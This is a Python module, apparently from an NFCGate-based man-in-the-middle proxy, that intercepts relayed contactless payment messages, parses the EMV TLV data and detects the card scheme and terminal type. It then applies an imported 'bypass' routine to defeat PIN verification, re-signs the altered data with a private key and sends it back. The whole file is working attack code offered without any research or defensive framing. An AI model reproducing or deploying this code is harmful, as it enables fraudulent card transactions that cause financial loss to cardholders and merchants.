"""
NFC data handler integrating all components.
"""
import traceback
from binascii import hexlify
from typing import Dict, Any, Optional
from .c2c_pb2 import NFCData
from .metaMessage_pb2 import Wrapper
from ..core.tlv_parser import parse_tlv, build_tlv, is_valid_tlv
from ..core.crypto_handler import sign_data, add_signature_to_tlvs
from ..core.payment_detector import get_scheme_from_tlvs, detect_terminal_type
from ..mitm.bypass_engine import bypass_tlv_modifications
from ..utils.logger import Logger

logger = Logger("NFCHandler")


def handle_nfc_data(data: bytes, private_key, state: Dict[str, Any]) -> bytes:
    """
    Process NFC data, bypass PIN verification for valid TLVs, and sign.
    
    Args:
        data: Raw NFC data bytes
        private_key: RSA private key for signing
        state: Current MITM state
        
    Returns:
        Modified NFC data bytes
    """
    try:
        # Set default state values
        state.setdefault('cdcvm_enabled', True)
        
        # Parse NFCData protobuf
        nfc = NFCData()
        nfc.ParseFromString(data)
        raw_data = nfc.data
        
        logger.info(f"Original NFC data: {hexlify(raw_data).decode()}")

        # Check if data is valid TLV
        if not is_valid_tlv(raw_data):
            logger.info("Data is not a valid TLV structure, returning unchanged")
            return data

        # Parse TLV data
        tlvs = parse_tlv(raw_data)
        
        # Detect payment scheme and terminal type
        scheme = get_scheme_from_tlvs(tlvs)
        terminal_type = detect_terminal_type(tlvs)
        
        logger.info(f"Scheme detected: {scheme}")
        logger.info(f"Terminal type detected: {terminal_type}")

        # Apply MITM modifications
        modified_tlvs = bypass_tlv_modifications(tlvs, scheme, terminal_type, state)
        
        if modified_tlvs is None:
            logger.info("Blocked all communication due to block_all setting, returning original data")
            return data

        # Build unsigned data
        unsigned_data = build_tlv(modified_tlvs)
        
        # Sign the data
        signature = sign_data(unsigned_data, private_key)
        
        # Add signature to TLVs
        signed_tlvs = add_signature_to_tlvs(modified_tlvs, signature)

        # Build final modified data
        modified_data = build_tlv(signed_tlvs)
        
        # Update NFCData with modified content
        nfc.data = modified_data
        result = nfc.SerializeToString()

        logger.info(f"Modified NFC data with PIN bypass and signature: {hexlify(result).decode()}")
        return result

    except ValueError as e:
        logger.error(f"Invalid TLV data: {e}, returning original data")
        return data
    except Exception as e:
        logger.error(f"Error in handle_nfc_data: {e}, returning original data")
        # Log full traceback to file
        try:
            with open('logs/nfcgate_proxy.log', 'a', encoding='utf-8') as f:
                traceback.print_exc(file=f)
        except:
            pass
        return data


def process_wrapper_message(wrapper_data: bytes, private_key, state: Dict[str, Any]) -> Optional[bytes]:
    """
    Process a Wrapper protobuf message containing NFC data.
    
    Args:
        wrapper_data: Wrapper protobuf bytes
        private_key: RSA private key for signing
        state: Current MITM state
        
    Returns:
        Modified wrapper data or None if no NFCData found
    """
    try:
        wrapper = Wrapper()
        wrapper.ParseFromString(wrapper_data)
        
        logger.debug("Parsed Wrapper message successfully")
        
        if wrapper.HasField('NFCData'):
            logger.info(f"Wrapper contains NFCData: {hexlify(wrapper.NFCData.data).decode()[:100]}...")
            
            # Process the NFC data
            modified_nfc_data = handle_nfc_data(wrapper.NFCData.SerializeToString(), private_key, state)
            
            # Create response wrapper
            response_wrapper = Wrapper()
            response_nfc = NFCData()
            response_nfc.ParseFromString(modified_nfc_data)
            response_wrapper.NFCData.CopyFrom(response_nfc)
            
            result = response_wrapper.SerializeToString()
            logger.info(f"Returning modified NFC data: {hexlify(response_wrapper.NFCData.data).decode()[:100]}...")
            
            return result
        else:
            field = wrapper.WhichOneof('message')
            logger.info(f"No NFCData in Wrapper, found field: {field}")
            
            if wrapper.HasField('Anticol'):
                logger.info(f"Anticol data: {hexlify(wrapper.Anticol.uid).decode()}")
            elif wrapper.HasField('Status'):
                logger.info(f"Status: code={wrapper.Status.code}, message={wrapper.Status.message}")
            elif wrapper.HasField('Data'):
                logger.info(f"Data: payload={hexlify(wrapper.Data.payload).decode()[:100]}...")
                # Try to parse inner wrapper
                return process_inner_wrapper(wrapper.Data.payload, private_key, state)
            elif wrapper.HasField('Session'):
                logger.info(f"Session: id={wrapper.Session.session_id}, status={wrapper.Session.status}")
            
            return None

    except Exception as e:
        logger.error(f"Failed to process Wrapper: {e}")
        traceback.print_exc()
        return None


def process_inner_wrapper(payload: bytes, private_key, state: Dict[str, Any]) -> Optional[bytes]:
    """
    Process inner wrapper data that might contain NFCData.
    
    Args:
        payload: Inner wrapper payload bytes
        private_key: RSA private key for signing
        state: Current MITM state
        
    Returns:
        Modified wrapper data or None if no NFCData found
    """
    try:
        inner_wrapper = Wrapper()
        inner_wrapper.ParseFromString(payload)
        
        logger.debug("Parsed inner Wrapper from Data message")
        
        if inner_wrapper.HasField('NFCData'):
            logger.info(f"Inner Wrapper contains NFCData: {hexlify(inner_wrapper.NFCData.data).decode()[:100]}...")
            
            # Process the inner NFC data
            modified_data = handle_nfc_data(inner_wrapper.NFCData.SerializeToString(), private_key, state)
            
            # Create response
            response_inner_wrapper = Wrapper()
            response_nfc = NFCData()
            response_nfc.ParseFromString(modified_data)
            response_inner_wrapper.NFCData.CopyFrom(response_nfc)
            
            # Wrap in outer Data message
            response_data = Wrapper()
            response_data.Data.payload = response_inner_wrapper.SerializeToString()
            
            result = response_data.SerializeToString()
            logger.info(f"Returning modified NFC data from inner Wrapper: {hexlify(response_inner_wrapper.NFCData.data).decode()[:100]}...")
            
            return result
        else:
            inner_field = inner_wrapper.WhichOneof('message')
            logger.info(f"No NFCData in inner Wrapper, found field: {inner_field}")
            return None
            
    except Exception as e:
        logger.error(f"Failed to parse inner Wrapper: {e}")
        return None
